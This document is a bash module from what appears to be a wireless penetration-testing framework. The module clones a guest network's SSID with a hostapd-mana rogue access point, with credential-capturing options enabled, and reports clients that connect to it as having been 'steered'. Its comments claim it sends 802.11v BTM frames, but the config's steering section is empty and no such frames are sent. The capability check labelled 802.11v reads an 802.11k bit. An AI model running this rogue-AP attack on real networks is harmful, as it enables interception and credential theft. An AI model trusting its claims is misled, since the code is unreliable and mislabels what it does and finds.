#!/usr/bin/env bash
#===============================================================================
#  modules/g5_bss_transition_attack.sh
#  G5: BSS Transition Roaming Attack (802.11v)
#
#  PURPOSE:
#    Test if clients can be silently "steered" from the legitimate AP to a 
#    rogue AP using 802.11v BSS Transition Management (BTM) frames.
#    This is a quieter alternative to deauthentication.
#===============================================================================

run_g5() {
    local total_steps=5
    local evidence_prefix="${SESSION_EVIDENCE_DIR}/g5"
    
    log_step 1 $total_steps "Detecting 802.11v/k Support"
    update_tc_progress 1 $total_steps "Detection"

    if [[ -z "${GUEST_SSID:-}" ]]; then
        log_error "Target SSID not set. Run A1 first."; return 1
    fi

    # Verify if the AP advertises 802.11v (BSS Transition)
    enable_monitor_mode || return 1
    local mon_iface="${MONITOR_INTERFACE}"
    local beacon_file="/tmp/g5_check.pcap"
    
    log_info "Analyzing beacons for 802.11v/k capabilities..."
    ${TOOL_PATHS[tcpdump]} -i "$mon_iface" -c 20 -w "$beacon_file" "type mgt subtype beacon and ether src ${GUEST_BSSID}" &>/dev/null || true
    
    local dot11v_supported="false"
    if [[ -f "$beacon_file" ]]; then
        # Check for Wireless Management capability bit (802.11v)
        if ${TOOL_PATHS[tshark]} -r "$beacon_file" -Y "wlan.mgt.fixed.capabilities.radio_measurement == 1" 2>/dev/null | grep -q "."; then
            dot11v_supported="true"
            log_success "802.11v/k (Radio Measurement) support detected in AP beacons."
        fi
        rm -f "$beacon_file"
    fi

    log_step 2 $total_steps "Preparing Roaming Rogue AP"
    update_tc_progress 2 $total_steps "Setup"

    # This attack requires hostapd-mana for BTM frame injection
    if [[ ! -x "${TOOL_PATHS[hostapd-mana]}" ]] && ! command -v hostapd-mana &>/dev/null; then
        log_error "hostapd-mana is required for BSS Transition attacks."
        return 1
    fi

    local mana_conf="${SESSION_EVIDENCE_DIR}/g5_mana.conf"
    local ap_iface="${WIFI_INTERFACE:-wlan0}"
    
    cat <<EOF > "$mana_conf"
interface=${ap_iface}
driver=nl80211
ssid=${GUEST_SSID}
hw_mode=g
channel=1
# Enable MANA steering and BTM
mana_wpe=1
mana_loud=1
# BTM Steering parameters
EOF

    log_step 3 $total_steps "Initiating Steering Attack"
    update_tc_progress 3 $total_steps "Steering"

    log_info "Deploying Rogue AP and sending BTM steering frames..."
    # Start hostapd-mana with steering enabled
    hostapd-mana "$mana_conf" > "${evidence_prefix}_mana.log" 2>&1 &
    local mana_pid=$!
    register_cleanup "kill -TERM $mana_pid 2>/dev/null || true; wait $mana_pid 2>/dev/null || true"

    start_countdown 60 "Monitoring for silent client roaming"
    sleep 60
    stop_countdown

    log_step 4 $total_steps "Verifying Roam Status"
    local roam_detected="false"
    if grep -qi "associated" "${evidence_prefix}_mana.log"; then
        roam_detected="true"
        log_result "CRITICAL" "BSS Transition Roam SUCCESSFUL: Client silently moved to Rogue AP!"
    fi

    log_step 5 $total_steps "Saving Results"
    local result_status="SECURE"
    [[ "$roam_detected" == "true" ]] && result_status="VULNERABLE"
    
    local result_json=$(${TOOL_PATHS[jq]} -n \
        --arg status "$result_status" \
        --arg summary "BSS Transition Attack: ${result_status}" \
        --arg details "802.11v detected: ${dot11v_supported}, Client Roamed: ${roam_detected}" \
        '{
            status: $status,
            summary: $summary,
            details: $details
        }')
    
    save_tc_result "G5" "$result_json"
    return 0
}
